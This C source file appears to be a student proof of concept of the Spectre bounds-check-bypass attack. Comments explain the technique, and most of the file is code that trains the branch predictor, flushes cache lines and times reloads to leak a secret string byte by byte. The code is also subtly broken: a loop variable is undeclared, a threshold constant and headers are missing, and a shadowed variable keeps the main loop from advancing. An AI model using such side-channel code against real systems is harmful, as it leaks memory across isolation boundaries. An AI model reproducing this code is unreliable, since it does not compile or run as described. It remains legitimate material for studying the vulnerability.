// Spectre Attack
// Joshua DeMoss
//
// This program exploits a former vulnerability in many modern systems that allowed for the breaking
// of intra and inter process isolation. This program is able to steal secret information by exploiting
// the out of order execution feature that existed using a timing side channel attack.

// How it works:
// First train a sandbox function to access infromation using appropriate requests. For the 
// Sandbox function, that would be giving restrictedAccess() an input less than the buffer size.

// Then after the function is trained, request information that is not allowed. In the sandbox
// function, this would be giving an input greater than the buffer size.

// Out of order execution works by loading the answer to the request before it checks for access.
// It does this in order to save time due to similar requests being permitted in the past. When the program
// processes the access part, it throws does not provide the information that was requested. The flaw in the
// design, though, is that while it does not provide the requested information, the requested information was loaded
// into cache. Thus one can figure out what the secret value was by examining the cache after the access.

// This is what this program does. It uses a cache timing side channel attack to discover secret information stored
// in cache. This vulnerability is essentially used to perform a buffer overflow attack on a function that protects against
// typical buffer overflow attacks.

#include <emmintrin.h>
#include <x86intrin.h>

#define DELTA 1024
unsigned int buffer_size = 10;
uint8_t buffer[10] = {0,1,2,3,4,5,6,7,8,9};
uint8_t temp = 0;
char *secret = "Some Secret Value";
uint8_t array[256*4096];

// Sandbox Function
uint8_t restrictedAccess(size_t x)
{
	if (x < buffer_size) {
		return buffer[x];
	} else {
		return 0;
	}
}

// Clear the cache so that the secret value loading is noticible
void flushSideChannel()
{
	int i;
	// Write to array to bring it to RAM to prevent Copy-on-write
	for (i = 0; i < 256; i++) array[i*4096 + DELTA] = 1;
	// flush the values of the aray from cache
	for (i = 0; i < 256; i++) _mm_clflush(&array[i*4096 + DELTA]);
}


// Function to check if the character was loaded into cache
static int scores[256];
void reloadSideChannelImproved()
{
	int i;
	volatile uint8_t *addr;
	register uint64_t time1, time2;
	int junk = 0;
	for (i = 0; i < 256; i++) {
		addr = &array[i * 4096 + DELTA];
		time1 = __rdtscp(&junk);
		junk = *addr;
		time2 = __rdtscp(&junk) - time1;
		if (time2 <= CACHE_HIT_THRESHOLD)
			scores[i]++; /* if cache hit, add 1 for this value */
	}
}

// Run the spectre attacak -- train the sandbox function, flush the cache, then do a timing
// side channel attack
void spectreAttack(size_t larger_x)
{
	int i;
	uint8_t s;
	for (i = 0; i < 256; i++) { _mm_clflush(&array[i*4096 + DELTA]); }

	// Train the CPU to take the true branch inside victim().
	for (i = 0; i < 10; i++) {
		_mm_clflush(&buffer_size);
		for (z = 0; z < 100; z++) {}
		restrictedAccess(i);
	}

	// Flush buffer_size and array[] from the cache.
	_mm_clflush(&buffer_size);
	for (i = 0; i < 256; i++) { _mm_clflush(&array[i*4096 + DELTA]); }
	// Ask victim() to return the secret in out-of-order execution.
	for (z = 0; z < 100; z++) {}
	s = restrictedAccess(larger_x);
	array[s*4096 + DELTA] += 88;
}


// Run the spectre attack many times to reveal the full secret value.
int main()
{
	int z;
	printf("The secret value is: \n");
	int max = -1;
	size_t larger_x = (size_t)(secret-(char*)buffer);
	for (z = larger_x; max != 0; z++) {
		int i;
		uint8_t s;
		flushSideChannel();
		for (i = 0; i < 256; i++) scores[i] = 0;
		for (i = 0; i < 1000; i++) {
			spectreAttack(larger_x);
			reloadSideChannelImproved();
		}

		int max = 0;
		for (i = 0; i < 256; i++){
			if(scores[max] < scores[i]) max = i;
		}
		printf("%c\n", max);
	}
	return (0);
}
